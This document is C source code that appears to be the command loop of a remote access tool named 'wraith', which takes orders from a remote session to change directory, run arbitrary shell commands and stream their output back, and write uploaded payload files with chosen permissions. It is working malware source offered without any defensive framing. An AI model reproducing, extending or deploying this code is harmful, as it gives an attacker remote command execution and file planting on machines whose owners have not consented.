#include <fcntl.h>
#include <pthread.h>
#include <safe_memset.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

#include <wraith.h>

struct rat_payload {
    uint8_t     remote_file_path[256];
    uint32_t    mode;
    char        payload[];
};

static int
wraith_chdir(wraith_session_t *session, char *dir)
{
    int opcode;
    
    opcode = WRAITH_MSG_CMD_FAIL;

    if (dir) {
        DEBUG_PRINT("r_cmd=chdir(\"%s\")", dir);
        
        if (chdir(dir) == 0) {
            opcode = WRAITH_MSG_CMD_SUCC;
        }
    }

    send_wraith_msg(session, opcode, 0, 0, NULL);

    return 0;
}

static int
wraith_exec(wraith_session_t *session, char *command)
{
    char buf[256];
    int stat;
    size_t nread;
    FILE *fp;

    fp = popen_ex(command, "r");

    if (!fp) {
        return 0;
    }

    while ((nread = fread(buf, 1, 256, fp)) > 0) {
        send_wraith_msg(session, WRAITH_MSG_ECHO, 0, nread, buf);
        safe_memset(buf, 256);
    }

    stat = pclose_ex(fp);

    DEBUG_PRINT("exited with code %d", stat);

    send_wraith_msg(session, WRAITH_MSG_CMD_SUCC, stat, 0, NULL);

    return 0;
}

static int
wraith_put_and_exec(wraith_session_t *session, struct wraith_msg *cmd, char *payload)
{
    struct rat_payload *rat; 
    size_t payload_size;
    FILE *fp; 

    rat = (struct rat_payload*)payload;
    payload_size = cmd->opt_payload_size - sizeof(struct rat_payload);

    if (payload_size <= 0) {
        ERROR_PRINT("Got invalid payload!");
        return -1;
    }

    DEBUG_PRINT("Write payload into directory: %s", rat->remote_file_path);

    fp = fopen(rat->remote_file_path, "w");

    if (fp) {
        fwrite(rat->payload, 1, payload_size, fp);
        fclose(fp);
        chmod(rat->remote_file_path, rat->mode);
    } else {
        ERROR_PRINT("Could not upload payload!");

        return -1;
    }

    return 0;
}

bool
handle_wraith_msg(wraith_session_t *session, struct wraith_msg *cmd, char *payload)
{
    DEBUG_PRINT("cmd=%d", cmd->opcode);

    switch (cmd->opcode) {
        case WRAITH_CMD_CHDIR:
            wraith_chdir(session, payload);
            break;
        case WRAITH_CMD_EXEC:
            wraith_exec(session, payload);
            break;
        case WRAITH_CMD_PUT:
            wraith_put_and_exec(session, cmd, payload);
            break;
    }

    if (cmd->opt_payload_size > 0) {
        safe_memset(payload, cmd->opt_payload_size);
    }

    return true;
}

bool
send_wraith_msg(wraith_session_t *session, int opcode, int arg, int payload_len, const char *payload)
{
    struct wraith_msg msg;

    DEBUG_PRINT("send msg=%x, arg=%d", opcode, arg);

    msg.opcode = opcode;
    msg.arg = arg;
    msg.opt_payload_size = payload_len;

    session_write(session, (const char*)&msg, sizeof(struct wraith_msg));

    if (payload && payload_len > 0) {
        session_write(session, payload, payload_len);
    }

    return true;
}

void
wraith_cmd_loop(wraith_session_t *session)
{
    bool succ;
    char *payload;
    struct wraith_msg cmd;

    DEBUG_PRINT("main dispatch loop reached");

    do {
        if (session_read_all(session, (char*)&cmd, sizeof(struct wraith_msg)) > 0) {
            payload = NULL;

            if (cmd.opt_payload_size > 0) {
                payload = (char*)calloc(1, cmd.opt_payload_size + 1);

                session_read_all(session, payload, cmd.opt_payload_size);
                DEBUG_PRINT("read payload as %p", payload);
                DEBUG_PRINT("payload length is %d", cmd.opt_payload_size);
            }

            succ = handle_wraith_msg(session, &cmd, payload);
            
            if (payload) {
                safe_memset(payload, cmd.opt_payload_size);
                free(payload);
            }

        } else {
            ERROR_PRINT("read_all() fail, assuming client disconnect!");
            succ = false;
        }
    } while (succ);

    session_close(session);
    free(session);
}